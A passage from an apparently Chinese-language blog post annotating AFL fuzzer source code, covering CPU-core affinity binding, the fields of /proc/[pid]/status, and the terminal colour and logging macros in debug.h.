&#123;</span><br><span class="line">    <span class="comment">/* 自动寻找第一个空闲的 CPU 核心 */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; cpu_core_count; i++)</span><br><span class="line">      <span class="keyword">if</span> (!cpu_used[i])</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 如果所有 CPU 核心都被占用 */</span></span><br><span class="line">  <span class="keyword">if</span> (i == cpu_core_count) &#123;</span><br><span class="line">    <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">         <span class="string">&quot;Uh-oh, looks like all %u CPU cores on your system are allocated to\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    other instances of afl-fuzz (or similar CPU-locked tasks). &quot;</span></span><br><span class="line">         <span class="string">&quot;Starting\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    another fuzzer on this machine is probably a bad plan, but if &quot;</span></span><br><span class="line">         <span class="string">&quot;you are\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    absolutely sure, you can set AFL_NO_AFFINITY and try again.\n&quot;</span>,</span><br><span class="line">         cpu_core_count);</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;No more free CPU cores&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">OKF</span>(<span class="string">&quot;Found a free CPU core, binding to #%u.&quot;</span>, i);</span><br><span class="line">  </span><br><span class="line">  cpu_aff = i;  <span class="comment">// 保存绑定的 CPU 核心编号</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 设置 CPU 亲和性，将当前进程绑定到选定的 CPU 核心 */</span></span><br><span class="line">  <span class="built_in">CPU_ZERO</span>(&amp;c);                            <span class="comment">// 清空 CPU 集合</span></span><br><span class="line">  <span class="built_in">CPU_SET</span>(i, &amp;c);                          <span class="comment">// 将选定的 CPU 核心添加到集合中</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 调用系统调用设置 CPU 亲和性</span></span><br><span class="line"><span class="comment">   * 参数：0 表示当前进程，sizeof(c) 是集合大小，&amp;c 是 CPU 集合 */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">sched_setaffinity</span>(<span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(c), &amp;c))</span><br><span class="line">    <span class="built_in">PFATAL</span>(<span class="string">&quot;sched_setaffinity failed&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我先简单介绍一下<strong>status</strong>这个文件</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line"> * /proc/[pid]/status 文件格式说明</span><br><span class="line"> * ================================</span><br><span class="line"> * </span><br><span class="line"> * 基本进程信息</span><br><span class="line"> * ------------</span><br><span class="line"> * Name:            进程名称（最多15个字符）</span><br><span class="line"> * Umask:           文件创建掩码</span><br><span class="line"> * State:           进程状态 - R(运行) S(睡眠) D(不可中断睡眠) T(停止) Z(僵尸) X(死亡) I(空闲)</span><br><span class="line"> * Tgid:            线程组ID（主线程的PID）</span><br><span class="line"> * Ngid:            NUMA组ID</span><br><span class="line"> * Pid:             进程ID</span><br><span class="line"> * PPid:            父进程ID</span><br><span class="line"> * TracerPid:       跟踪此进程的进程ID（0表示没有）</span><br><span class="line"> * </span><br><span class="line"> * 用户和组信息</span><br><span class="line"> * ------------</span><br><span class="line"> * Uid:             真实UID 有效UID 保存的UID 文件系统UID</span><br><span class="line"> * Gid:             真实GID 有效GID 保存的GID 文件系统GID</span><br><span class="line"> * FDSize:          文件描述符表的大小</span><br><span class="line"> * Groups:          补充组列表</span><br><span class="line"> * </span><br><span class="line"> * 命名空间信息</span><br><span class="line"> * ------------</span><br><span class="line"> * NStgid:          命名空间中的线程组ID</span><br><span class="line"> * NSpid:           命名空间中的进程ID</span><br><span class="line"> * NSpgid:          命名空间中的进程组ID</span><br><span class="line"> * NSsid:           命名空间中的会话ID</span><br><span class="line"> * Kthread:         是否为内核线程（0=用户进程，1=内核线程）</span><br><span class="line"> * </span><br><span class="line"> * 内存信息（AFL重点关注）</span><br><span class="line"> * ----------------------</span><br><span class="line"> * VmPeak:          虚拟内存峰值</span><br><span class="line"> * VmSize:          当前虚拟内存大小  AFL用此区分用户进程和内核线程</span><br><span class="line"> * VmLck:           锁定的内存大小</span><br><span class="line"> * VmPin:           固定的内存页</span><br><span class="line"> * VmHWM:           物理内存使用峰值</span><br><span class="line"> * VmRSS:           当前物理内存使用（驻留集大小）</span><br><span class="line"> * RssAnon:         匿名内存页</span><br><span class="line"> * RssFile:         文件映射页</span><br><span class="line"> * RssShmem:        共享内存页</span><br><span class="line"> * VmData:          数据段大小</span><br><span class="line"> * VmStk:           栈大小</span><br><span class="line"> * VmExe:           可执行代码段大小</span><br><span class="line"> * VmLib:           共享库大小</span><br><span class="line"> * VmPTE:           页表项大小</span><br><span class="line"> * VmSwap:          交换空间使用</span><br><span class="line"> * HugetlbPages:    大页内存使用</span><br><span class="line"> * </span><br><span class="line"> * 线程和信号</span><br><span class="line"> * ----------</span><br><span class="line"> * Threads:         线程数</span><br><span class="line"> * SigQ:            待处理信号数/最大信号数</span><br><span class="line"> * SigPnd:          待处理信号位图</span><br><span class="line"> * ShdPnd:          共享待处理信号</span><br><span class="line"> * SigBlk:          阻塞的信号</span><br><span class="line"> * SigIgn:          忽略的信号</span><br><span class="line"> * SigCgt:          捕获的信号</span><br><span class="line"> * </span><br><span class="line"> * 权限能力（Capabilities）</span><br><span class="line"> * ----------------------</span><br><span class="line"> * CapInh:          可继承的能力</span><br><span class="line"> * CapPrm:          允许的能力</span><br><span class="line"> * CapEff:          有效的能力</span><br><span class="line"> * CapBnd:          能力边界集</span><br><span class="line"> * CapAmb:          环境能力</span><br><span class="line"> * </span><br><span class="line"> * 安全相关</span><br><span class="line"> * --------</span><br><span class="line"> * NoNewPrivs:      是否设置了no<span class="built_in">_</span>new<span class="built_in">_</span>privs</span><br><span class="line"> * Seccomp:         Seccomp状态（0=禁用，1=严格，2=过滤）</span><br><span class="line"> * Seccomp<span class="built_in">_</span>filters: Seccomp过滤器数量</span><br><span class="line"> * Speculation<span class="built_in">_</span>Store<span class="built_in">_</span>Bypass:     CPU漏洞缓解状态</span><br><span class="line"> * SpeculationIndirectBranch:    CPU漏洞缓解状态</span><br><span class="line"> * </span><br><span class="line"> * CPU亲和性（AFL重点关注）</span><br><span class="line"> * ----------------------</span><br><span class="line"> * Cpus<span class="built_in">_</span>allowed:      CPU位图（十六进制表示）</span><br><span class="line"> * Cpus<span class="built_in">_</span>allowed<span class="built_in">_</span>list: 允许运行的CPU列表  AFL用此查找绑定到单核的进程</span><br><span class="line"> *                    格式示例：</span><br><span class="line"> *                    - &quot;0-127&quot;    可以在所有128个CPU上运行</span><br><span class="line"> *                    - &quot;0&quot;        只能在CPU 0上运行（AFL要找的）</span><br><span class="line"> *                    - &quot;0,2,4&quot;    可以在CPU 0、2、4上运行</span><br><span class="line"> *                    - &quot;0-3,8-11&quot; 可以在CPU 0-3和8-11上运行</span><br><span class="line"> * </span><br><span class="line"> * NUMA内存节点</span><br><span class="line"> * -----------</span><br><span class="line"> * Mems<span class="built_in">_</span>allowed:      允许的内存节点位图</span><br><span class="line"> * Mems<span class="built_in">_</span>allowed<span class="built_in">_</span>list: 允许的内存节点列表</span><br><span class="line"> * </span><br><span class="line"> * 性能统计</span><br><span class="line"> * --------</span><br><span class="line"> * voluntary<span class="built_in">_</span>ctxt<span class="built_in">_</span>switches:    自愿上下文切换次数</span><br><span class="line"> * nonvoluntary<span class="built_in">_</span>ctxt<span class="built_in">_</span>switches: 非自愿上下文切换次数</span><br><span class="line"> * </span><br><span class="line"> * 架构特定（x86）</span><br><span class="line"> * --------------</span><br><span class="line"> * x86<span class="built_in">_</span>Thread<span class="built_in">_</span>features:        线程特性</span><br><span class="line"> * x86<span class="built_in">_</span>Thread<span class="built_in">_</span>features<span class="built_in">_</span>locked: 锁定的线程特性</span><br><span class="line"> * </span><br><span class="line"> * </span><br><span class="line"> * AFL使用说明：</span><br><span class="line"> * ===========</span><br><span class="line"> * AFL通过解析status文件来查找空闲的CPU核心：</span><br><span class="line"> * 1. 检查VmSize字段 - 存在则为用户进程，不存在则为内核线程（忽略）</span><br><span class="line"> * 2. 检查Cpus<span class="built_in">_</span>allowed<span class="built_in">_</span>list字段 - 如果是单个数字（如&quot;2&quot;），表示进程绑定到该CPU</span><br><span class="line"> * 3. 标记所有绑定到单个CPU的用户进程占用的核心</span><br><span class="line"> * 4. 选择一个未被占用的核心进行绑定</span><br><span class="line"> */</span><br></pre></td></tr></table></figure><h3 id="CPU-Affinity-API"><a href="#CPU-Affinity-API" class="headerlink" title="CPU Affinity API"></a>CPU Affinity API</h3><h4 id="cpu-set-t-数据结构"><a href="#cpu-set-t-数据结构" class="headerlink" title="cpu_set_t 数据结构"></a><strong>cpu_set_t 数据结构</strong></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cpu_set_t</span> c;  <span class="comment">// CPU 集合，本质上是一个位图（bitmap）</span></span><br></pre></td></tr></table></figure><p><code>cpu_set_t</code> 是一个位图结构，每一位代表一个 CPU 核心</p><p>如果某位为 1，表示该 CPU 在集合中；为 0 表示不在集合中</p><h4 id="CPU-ZERO-amp-c"><a href="#CPU-ZERO-amp-c" class="headerlink" title="CPU_ZERO(&amp;c)"></a><strong>CPU_ZERO(&amp;c)</strong></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CPU_ZERO(&amp;c);  <span class="comment">// 清空 CPU 集合，将所有位设置为 0</span></span><br></pre></td></tr></table></figure><p>将 CPU 集合中的所有位清零</p><p>清空后，集合中不包含任何 CPU 核心</p><p>相当于创建一个空集合</p><h4 id="CPU-SET-i-amp-c"><a href="#CPU-SET-i-amp-c" class="headerlink" title="CPU_SET(i, &amp;c)"></a>CPU_SET(i, &amp;c)</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CPU_SET(i, &amp;c);  <span class="comment">// 将 CPU 核心 i 添加到集合中</span></span><br></pre></td></tr></table></figure><p>将第 i 个 CPU 核心添加到集合中</p><p>实际上是将位图中第 i 位设置为 1</p><p>i 从 0 开始计数（0 表示第一个核心）<br><code>cpu_set_t</code> 本身只是一个<strong>数据结构</strong>（位图），它可以用来表示任意的 CPU 集合。真正决定它作用于哪个进程的是 <code>sched_setaffinity()</code> 函数的第一个参数：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* 调用系统调用设置 CPU 亲和性</span><br><span class="line">   * 参数：0 表示当前进程，sizeof(c) 是集合大小，&amp;c 是 CPU 集合 */</span><br><span class="line">  if (sched_setaffinity(0, sizeof(c), &amp;c))</span><br><span class="line">    PFATAL(&quot;sched_setaffinity failed&quot;);</span><br></pre></td></tr></table></figure><h3 id="各种输出格式化宏"><a href="#各种输出格式化宏" class="headerlink" title="各种输出格式化宏"></a>各种输出格式化宏</h3><p>我们可以看到这里包括之前会出现很多向屏幕输出的函数，这里我统一介绍一下,也就是debug.h</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Copyright 2013 Google LLC All rights reserved.</span></span><br><span class="line"><span class="comment">  [Apache License 2.0 授权信息]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   american fuzzy lop - debug / error handling macros</span></span><br><span class="line"><span class="comment">   --------------------------------------------------</span></span><br><span class="line"><span class="comment">   调试和错误处理宏定义文件</span></span><br><span class="line"><span class="comment">   </span></span><br><span class="line"><span class="comment">   Written and maintained by Michal Zalewski &lt;lcamtuf@google.com&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _HAVE_DEBUG_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _HAVE_DEBUG_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;config.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*******************</span></span><br><span class="line"><span class="comment"> * Terminal colors *</span></span><br><span class="line"><span class="comment"> * 终端颜色定义</span></span><br><span class="line"><span class="comment"> *******************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USE_COLOR  <span class="comment">/* 如果启用了颜色支持 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 前景色定义 - ANSI 转义序列 */</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> cBLK <span class="meta-string">&quot;\x1b[0;30m&quot;</span>    <span class="comment">/* 黑色 (Black) */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> cRED <span class="meta-string">&quot;\x1b[0;31m&quot;</span>    <span class="comment">/* 红色 (Red) */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> cGRN <span class="meta-string">&quot;\x1b[0;32m&quot;</span>    <span class="comment">/* 绿色 (Green) */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> cBRN <span class="meta-string">&quot;\x1b[0;33m&quot;</span>    <span class="comment">/* 棕色 (Brown) */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> cBLU <span class="meta-string">&quot;\x1b[0;34m&quot;</span>    <span class="comment">/* 蓝色 (Blue) */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> cMGN <span class="meta-string">&quot;\x1b[0;35m&quot;</span>    <span class="comment">/* 品红 (Magenta) */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> cCYA <span class="meta-string">&quot;\x1b[0;36m&quot;</span>    <span class="comment">/* 青色 (Cyan) */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> cLGR <span class="meta-string">&quot;\x1b[0;37m&quot;</span>    <span class="comment">/* 浅灰 (Light Gray) */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 高亮/明亮的前景色 */</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> cGRA <span class="meta-string">&quot;\x1b[1;90m&quot;</span>    <span class="comment">/* 灰色 (Gray) */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> cLRD <span class="meta-string">&quot;\x1b[1;91m&quot;</span>    <span class="comment">/* 亮红 (Light Red) */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> cLGN <span class="meta-string">&quot;\x1b[1;92m&quot;</span>    <span class="comment">/* 亮绿 (Light Green) */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> cYEL <span class="meta-string">&quot;\x1b[1;93m&quot;</span>    <span class="comment">/* 黄色 (Yellow) */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> cLBL <span class="meta-string">&quot;\x1b[1;94m&quot;</span>    <span class="comment">/* 亮蓝 (Light Blue) */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> cPIN <span class="meta-string">&quot;\x1b[1;95m&quot;</span>    <span class="comment">/* 粉色 (Pink) */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> cLCY <span class="meta-string">&quot;\x1b[1;96m&quot;</span>    <span class="comment">/* 亮青 (Light Cyan) */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> cBRI <span class="meta-string">&quot;\x1b[1;97m&quot;</span>    <span class="comment">/* 亮白 (Bright White) */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> cRST <span class="meta-string">&quot;\x1b[0m&quot;</span>       <span class="comment">/* 重置所有属性 (Reset) */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 背景色定义 */</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bgBLK <span class="meta-string">&quot;\x1b[40m&quot;</span>     <span class="comment">/* 黑色背景 */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bgRED <span class="meta-string">&quot;\x1b[41m&quot;</span>     <span class="comment">/* 红色背景 */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bgGRN <span class="meta-string">&quot;\x1b[42m&quot;</span>     <span class="comment">/* 绿色背景 */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bgBRN <span class="meta-string">&quot;\x1b[43m&quot;</span>     <span class="comment">/* 棕色背景 */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bgBLU <span class="meta-string">&quot;\x1b[44m&quot;</span>     <span class="comment">/* 蓝色背景 */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bgMGN <span class="meta-string">&quot;\x1b[45m&quot;</span>     <span class="comment">/* 品红背景 */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bgCYA <span class="meta-string">&quot;\x1b[46m&quot;</span>     <span class="comment">/* 青色背景 */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bgLGR <span class="meta-string">&quot;\x1b[47m&quot;</span>     <span class="comment">/* 浅灰背景 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 高亮背景色 */</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bgGRA <span class="meta-string">&quot;\x1b[100m&quot;</span>    <span class="comment">/* 灰色背景 */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bgLRD <span class="meta-string">&quot;\x1b[101m&quot;</span>    <span class="comment">/* 亮红背景 */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bgLGN <span class="meta-string">&quot;\x1b[102m&quot;</span>    <span class="comment">/* 亮绿背景 */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bgYEL <span class="meta-string">&quot;\x1b[103m&quot;</span>    <span class="comment">/* 黄色背景 */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bgLBL <span class="meta-string">&quot;\x1b[104m&quot;</span>    <span class="comment">/* 亮蓝背景 */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bgPIN <span class="meta-string">&quot;\x1b[105m&quot;</span>    <span class="comment">/* 粉色背景 */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bgLCY <span class="meta-string">&quot;\x1b[106m&quot;</span>    <span class="comment">/* 亮青背景 */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bgBRI <span class="meta-string">&quot;\x1b[107m&quot;</span>    <span class="comment">/* 亮白背景 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span>  <span class="comment">/* 如果不支持颜色，所有颜色宏定义为空字符串 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> cBLK <span class="meta-string">&quot;&quot;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> cRED <span class="meta-string">&quot;&quot;</span></span></span><br><span class="line"><span class="comment">/* ... 所有颜色宏都定义为空字符串 ... */</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> cRST <span class="meta-string">&quot;&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^USE_COLOR */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************</span></span><br><span class="line"><span class="comment"> * Box drawing sequences *</span></span><br><span class="line"><span class="comment"> * 方框绘制字符序列</span></span><br><span class="line"><span class="comment"> *************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> FANCY_BOXES  <span class="comment">/* 如果启用花式方框绘制 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 使用 VT100 图形字符集绘制方框 */</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> SET_G1   <span class="meta-string">&quot;\x1b)0&quot;</span>       <span class="comment">/* 设置 G1 字符集为图形模式 */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> RESET_G1 <span class="meta-string">&quot;\x1b)B&quot;</span>       <span class="comment">/* 重置 G1 字符集为 ASCII */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bSTART   <span class="meta-string">&quot;\x0e&quot;</span>         <span class="comment">/* 进入 G1 绘图模式 (SO - Shift Out) */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bSTOP    <span class="meta-string">&quot;\x0f&quot;</span>         <span class="comment">/* 退出 G1 绘图模式 (SI - Shift In) */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 线条绘制字符 */</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bH       <span class="meta-string">&quot;q&quot;</span>            <span class="comment">/* 水平线 ─ */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bV       <span class="meta-string">&quot;x&quot;</span>            <span class="comment">/* 垂直线 │ */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bLT      <span class="meta-string">&quot;l&quot;</span>            <span class="comment">/* 左上角 ┌ */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bRT      <span class="meta-string">&quot;k&quot;</span>            <span class="comment">/* 右上角 ┐ */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bLB      <span class="meta-string">&quot;m&quot;</span>            <span class="comment">/* 左下角 └ */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bRB      <span class="meta-string">&quot;j&quot;</span>            <span class="comment">/* 右下角 ┘ */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bX       <span class="meta-string">&quot;n&quot;</span>            <span class="comment">/* 十字交叉 ┼ */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bVR      <span class="meta-string">&quot;t&quot;</span>            <span class="comment">/* 垂直线右分支 ├ */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bVL      <span class="meta-string">&quot;u&quot;</span>            <span class="comment">/* 垂直线左分支 ┤ */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bHT      <span class="meta-string">&quot;v&quot;</span>            <span class="comment">/* 水平线上分支 ┴ */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bHB      <span class="meta-string">&quot;w&quot;</span>            <span class="comment">/* 水平线下分支 ┬ */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span>  <span class="comment">/* 不支持花式方框，使用 ASCII 字符 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> SET_G1   <span class="meta-string">&quot;&quot;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> RESET_G1 <span class="meta-string">&quot;&quot;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bSTART   <span class="meta-string">&quot;&quot;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bSTOP    <span class="meta-string">&quot;&quot;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bH       <span class="meta-string">&quot;-&quot;</span>    <span class="comment">/* 用减号表示水平线 */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bV       <span class="meta-string">&quot;|&quot;</span>    <span class="comment">/* 用竖线表示垂直线 */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bLT      <span class="meta-string">&quot;+&quot;</span>    <span class="comment">/* 用加号表示所有角落 */</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bRT      <span class="meta-string">&quot;+&quot;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bLB      <span class="meta-string">&quot;+&quot;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bRB      <span class="meta-string">&quot;+&quot;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bX       <span class="meta-string">&quot;+&quot;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bVR      <span class="meta-string">&quot;+&quot;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bVL      <span class="meta-string">&quot;+&quot;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bHT      <span class="meta-string">&quot;+&quot;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> bHB      <span class="meta-string">&quot;+&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^FANCY_BOXES */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/***********************</span></span><br><span class="line"><span class="comment"> * Misc terminal codes *</span></span><br><span class="line"><span class="comment"> * 其他终端控制码</span></span><br><span class="line"><span class="comment"> ***********************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TERM_HOME     <span class="meta-string">&quot;\x1b[H&quot;</span>        <span class="comment">/* 光标移到左上角 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TERM_CLEAR    TERM_HOME <span class="meta-string">&quot;\x1b[2J&quot;</span>  <span class="comment">/* 清屏：先回到左上角，再清除整个屏幕 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> cEOL          <span class="meta-string">&quot;\x1b[0K&quot;</span>        <span class="comment">/* 清除从光标到行尾的内容 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CURSOR_HIDE   <span class="meta-string">&quot;\x1b[?25l&quot;</span>     <span class="comment">/* 隐藏光标 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CURSOR_SHOW   <span class="meta-string">&quot;\x1b[?25h&quot;</span>     <span class="comment">/* 显示光标 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/************************</span></span><br><span class="line"><span class="comment"> * Debug &amp; error macros *</span></span><br><span class="line"><span class="comment"> * 调试和错误处理宏</span></span><br><span class="line"><span class="comment"> ************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 基础输出宏 - 决定输出到 stdout 还是 stderr */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> MESSAGES_TO_STDOUT</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> SAYF(x...)    printf(x)      <span class="comment">/* 输出到标准输出 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> </span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> SAYF(x...)    fprintf(stderr, x)  <span class="comment">/* 输出到标准错误（默认） */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^MESSAGES_TO_STDOUT */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 警告信息 - 黄色 [!] 标记 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WARNF(x...) do &#123; \</span></span><br><span class="line"><span class="meta">    SAYF(cYEL <span class="meta-string">&quot;[!] &quot;</span> cBRI <span class="meta-string">&quot;WARNING: &quot;</span> cRST x); \  <span class="comment">/* 黄色[!] + 亮白WARNING: + 重置颜色 + 用户信息 */</span></span></span><br><span class="line">    <span class="built_in">SAYF</span>(cRST <span class="string">&quot;\n&quot;</span>); \                             <span class="comment">/* 换行并重置颜色 */</span></span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 动作信息 - 亮蓝色 [*] 标记 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ACTF(x...) do &#123; \</span></span><br><span class="line"><span class="meta">    SAYF(cLBL <span class="meta-string">&quot;[*] &quot;</span> cRST x); \  <span class="comment">/* 亮蓝[*] + 重置颜色 + 用户信息 */</span></span></span><br><span class="line">    <span class="built_in">SAYF</span>(cRST <span class="string">&quot;\n&quot;</span>); \</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 成功信息 - 亮绿色 [+] 标记 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OKF(x...) do &#123; \</span></span><br><span class="line"><span class="meta">    SAYF(cLGN <span class="meta-string">&quot;[+] &quot;</span> cRST x); \  <span class="comment">/* 亮绿[+] + 重置颜色 + 用户信息 */</span></span></span><br><span class="line">    <span class="built_in">SAYF</span>(cRST <span class="string">&quot;\n&quot;</span>); \</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 错误信息（不常用）- 亮红色 [-] 标记 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BADF(x...) do &#123; \</span></span><br><span class="line"><span class="meta">    SAYF(cLRD <span class="meta-string">&quot;\n[-] &quot;</span> cRST x); \  <span class="comment">/* 亮红[-] + 重置颜色 + 用户信息 